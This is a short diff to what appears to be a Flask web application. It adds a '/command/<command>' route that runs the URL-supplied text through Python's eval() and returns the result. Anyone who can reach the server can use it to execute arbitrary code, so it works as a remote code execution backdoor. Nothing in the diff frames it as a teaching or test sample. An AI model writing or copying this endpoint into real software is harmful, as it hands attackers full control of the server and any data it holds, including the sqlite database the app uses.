@@ -12,6 +12,11 @@ def hello():
     return render_template("index.html")
 
 
+@app.route("/command/<command>")
+def execute_command(command):
+    result = eval(command)
+    return jsonify({"result": result})
+
 @app.route("/all")
 def all():
     conn = sqlite3.connect("database.db")
